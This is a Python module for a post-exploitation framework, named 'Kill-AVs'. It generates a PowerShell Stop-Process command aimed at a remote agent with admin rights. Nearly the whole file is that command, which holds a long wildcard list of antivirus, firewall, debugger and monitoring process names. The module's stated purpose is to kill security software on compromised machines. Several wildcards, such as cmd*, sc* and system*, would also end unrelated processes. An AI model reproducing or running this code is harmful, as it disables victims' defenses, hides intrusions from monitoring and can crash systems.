from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Kill-AVs',

            'Author': ['@paulwebsec'],

            'Description': ("Kills AV on the remote system."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [ ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # command to kill AVs
        script = "Stop-Process -name AAWTray*, Ad-Aware*, MSASCui*, _avp32*, _avpcc*, _avpm*, aAvgApi*, ackwin32*, adaware*, advxdwin*, agentsvr*, agentw*, alertsvc*, alevir*, alogserv*, amon9x*, anti-trojan*, antivirus*, ants*, apimonitor*, aplica32*, apvxdwin*, arr*, atcon*, atguard*, atro55en*, atupdater*, atwatch*, au*, aupdate*, auto-protect.nav80try*, autodown*, autotrace*, autoupdate*, avconsol*, ave32*, avgcc32*, avgctrl*, avgemc*, avgnt*, avgrsx*, avgserv*, avgserv9*, avguard*, avgw*, avkpop*, avkserv*, avkservice*, avkwctl9*, avltmain*, avnt*, avp*, avp*, avp32*, avpcc*, avpdos32*, avpm*, avptc32*, avpupd*, avsched32*, avsynmgr*, avwin*, avwin95*, avwinnt*, avwupd*, avwupd32*, avwupsrv*, avxmonitor9x*, avxmonitornt*, avxquar*, backweb*, bargains*, bd_professional*, beagle*, belt*, bidef*, bidserver*, bipcp*, bipcpevalsetup*, bisp*, blackd*, blackice*, blink*, blss*, bootconf*, bootwarn*, borg2*, bpc*, brasil*, bs120*, bundle*, bvt*, ccapp*, ccevtmgr*, ccpxysvc*, cdp*, cfd*, cfgwiz*, cfiadmin*, cfiaudit*, cfinet*, cfinet32*, claw95*, claw95cf*, clean*, cleaner*, cleaner3*, cleanpc*, click*, cmd*, cmd32*, cmesys*, cmgrdian*, cmon016*, connectionmonitor*, cpd*, cpf9x206*, cpfnt206*, ctrl*, cv*, cwnb181*, cwntdwmo*, datemanager*, dcomx*, defalert*, defscangui*, defwatch*, deputy*, divx*, dllcache*, dllreg*, doors*, dpf*, dpfsetup*, dpps2*, drwatson*, drweb32*, drwebupw*, dssagent*, dvp95*, dvp95_0*, ecengine*, efpeadm*, emsw*, ent*, esafe*, escanhnt*, escanv95*, espwatch*, ethereal*, etrustcipe*, evpn*, exantivirus-cnet*, exe.avxw*, expert*, explore*, f-agnt95*, f-prot*, f-prot95*, f-stopw*, fameh32*, fast*, fch32*, fih32*, findviru*, firewall*, fnrb32*, fp-win*, fp-win_trial*, fprot*, frw*, fsaa*, fsav*, fsav32*, fsav530stbyb*, fsav530wtbyb*, fsav95*, fsgk32*, fsm32*, fsma32*, fsmb32*, gator*, gbmenu*, gbpoll*, generics*, gmt*, guard*, guarddog*, hacktracersetup*, hbinst*, hbsrv*, hotactio*, hotpatch*, htlog*, htpatch*, hwpe*, hxdl*, hxiul*, iamapp*, iamserv*, iamstats*, ibmasn*, ibmavsp*, icload95*, icloadnt*, icmon*, icsupp95*, icsuppnt*, idle*, iedll*, iedriver*, iexplorer*, iface*, ifw2000*, inetlnfo*, infus*, infwin*, init*, intdel*, intren*, iomon98*, istsvc*, jammer*, jdbgmrg*, jedi*, kavlite40eng*, kavpers40eng*, kavpf*, kazza*, keenvalue*, kerio-pf-213-en-win*, kerio-wrl-421-en-win*, kerio-wrp-421-en-win*, kernel32*, killprocesssetup161*, launcher*, ldnetmon*, ldpro*, ldpromenu*, ldscan*, lnetinfo*, loader*, localnet*, lockdown*, lockdown2000*, lookout*, lordpe*, lsetup*, luall*, luau*, lucomserver*, luinit*, luspt*, mapisvc32*, mcagent*, mcmnhdlr*, mcshield*, mctool*, mcupdate*, mcvsrte*, mcvsshld*, md*, mfin32*, mfw2en*, mfweng3.02d30*, mgavrtcl*, mgavrte*, mghtml*, mgui*, minilog*, mmod*, monitor*, moolive*, mostat*, mpfagent*, mpfservice*, mpftray*, mrflux*, msapp*, msbb*, msblast*, mscache*, msccn32*, mscman*, msconfig*, msdm*, msdos*, msiexec16*, msinfo32*, mslaugh*, msmgt*, msmsgri32*, mssmmc32*, mssys*, msvxd*, mu0311ad*, mwatch*, n32scanw*, nav*, navap.navapsvc*, navapsvc*, navapw32*, navdx*, navlu32*, navnt*, navstub*, navw32*, navwnt*, nc2000*, ncinst4*, ndd32*, neomonitor*, neowatchlog*, netarmor*, netd32*, netinfo*, netmon*, netscanpro*, netspyhunter-1.2*, netstat*, netutils*, nisserv*, nisum*, nmain*, nod32*, normist*, norton_internet_secu_3.0_407*, notstart*, npf40_tw_98_nt_me_2k*, npfmessenger*, nprotect*, npscheck*, npssvc*, nsched32*, nssys32*, nstask32*, nsupdate*, nt*, ntrtscan*, ntvdm*, ntxconfig*, nui*, nupgrade*, nvarch16*, nvc95*, nvsvc32*, nwinst4*, nwservice*, nwtool16*, ollydbg*, onsrvr*, optimize*, ostronet*, otfix*, outpost*, outpostinstall*, outpostproinstall*, padmin*, panixk*, patch*, pavcl*, pavproxy*, pavsched*, pavw*, pccwin98*, pcfwallicon*, pcip10117_0*, pcscan*, pdsetup*, periscope*, persfw*, perswf*, pf2*, pfwadmin*, pgmonitr*, pingscan*, platin*, pop3trap*, poproxy*, popscan*, portdetective*, portmonitor*, powerscan*, ppinupdt*, pptbc*, ppvstop*, prizesurfer*, prmt*, prmvr*, procdump*, processmonitor*, procexplorerv1.0*, programauditor*, proport*, protectx*, pspf*, purge*, qconsole*, qserver*, rapapp*, rav7*, rav7win*, rav8win32eng*, ray*, rb32*, rcsync*, realmon*, reged*, regedit*, regedt32*, rescue*, rescue32*, rrguard*, rshell*, rtvscan*, rtvscn95*, rulaunch*, run32dll*, rundll*, rundll16*, ruxdll32*, safeweb*, sahagent*, save*, savenow*, sbserv*, sc*, scam32*, scan32*, scan95*, scanpm*, scrscan*, serv95*, setup_flowprotector_us*, setupvameeval*, sfc*, sgssfw32*, sh*, shellspyinstall*, shn*, showbehind*, smc*, sms*, smss32*, soap*, sofi*, sperm*, spf*, sphinx*, spoler*, spoolcv*, spoolsv32*, spyxx*, srexe*, srng*, ss3edit*, ssg_4104*, ssgrate*, st2*, start*, stcloader*, supftrl*, support*, supporter5*, svc*, svchostc*, svchosts*, svshost*, sweep95*, sweepnet.sweepsrv.sys.swnetsup*, symproxysvc*, symtray*, sysedit*, system*, system32*, sysupd*, taskmg*, taskmgr*, taskmo*, taskmon*, taumon*, tbscan*, tc*, tca*, tcm*, tds-3*, tds2-98*, tds2-nt*, teekids*, tfak*, tfak5*, tgbob*, titanin*, titaninxp*, tracert*, trickler*, trjscan*, trjsetup*, trojantrap3*, tsadbot*, tvmd*, tvtmd*, undoboot*, updat*, update*, upgrad*, utpost*, vbcmserv*, vbcons*, vbust*, vbwin9x*, vbwinntw*, vcsetup*, vet32*, vet95*, vettray*, vfsetup*, vir-help*, virusmdpersonalfirewall*, vnlan300*, vnpc3000*, vpc32*, vpc42*, vpfw30s*, vptray*, vscan40*, vscenu6.02d30*, vsched*, vsecomr*, vshwin32*, vsisetup*, vsmain*, vsmon*, vsstat*, vswin9xe*, vswinntse*, vswinperse*, w32dsm89*, w9x*, watchdog*, webdav*, webscanx*, webtrap*, wfindv32*, whoswatchingme*, wimmun32*, win-bugsfix*, win32*, win32us*, winactive*, window*, windows*, wininetd*, wininitx*, winlogin*, winmain*, winnet*, winppr32*, winrecon*, winservn*, winssk32*, winstart*, winstart001*, wintsk32*, winupdate*, wkufind*, wnad*, wnt*, wradmin*, wrctrl*, wsbgate*, wupdater*, wupdt*, wyvernworksfirewall*, xpf202en*, zapro*, zapsetup3001*, zatutor*, zonalm2601*, zonealarm*"

        return script
